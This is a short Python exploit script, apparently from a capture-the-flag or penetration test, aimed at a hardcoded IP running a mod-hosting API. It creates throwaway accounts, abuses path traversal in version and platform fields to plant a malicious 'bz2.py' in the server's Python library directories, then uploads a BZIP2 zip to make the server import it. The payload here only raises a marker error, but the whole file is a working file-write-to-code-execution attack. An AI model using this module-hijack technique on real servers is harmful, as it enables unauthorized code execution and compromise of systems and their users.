import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = "http://144.79.188.39:36310"
pf.BASE = BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

def test(ver, code, label):
    tok,u=fresh()
    mal = b'raise RuntimeError("BZ2_HIJACK_'+label.encode()+b'")\n'
    pid = pf.create_platform(tok, code, name="z")
    mid = pf.create_mod(tok, ver, title="z")
    bid = pf.create_build(tok, mid, pid)
    r = pf.upload_zip(tok, mid, bid, {"bz2.py": mal})
    print(f"[{label}] write bz2.py ->", r.status_code)
    pid2=pf.create_platform(tok, "t%d"%random.randint(0,9999), name="z"); mid2=pf.create_mod(tok,"v%d"%random.randint(0,9999),title="z"); bid2=pf.create_build(tok,mid2,pid2)
    bio=io.BytesIO()
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_BZIP2) as zf: zf.writestr("d.txt", b"x")
    bio.seek(0)
    t = requests.post(f"{BASE}/api/mods/{mid2}/builds/{bid2}/upload/", headers={"Authorization":f"Bearer {tok}"}, files={"zip_file":("p.zip",bio,"application/zip")}, timeout=20)
    print(f"[{label}] bzip2 trigger ->", t.status_code, t.text[:80])

test("../../..", "usr/lib/python3.11", "usrlib")
test("../../../usr/local", "lib/python3.11", "usrlocallib")
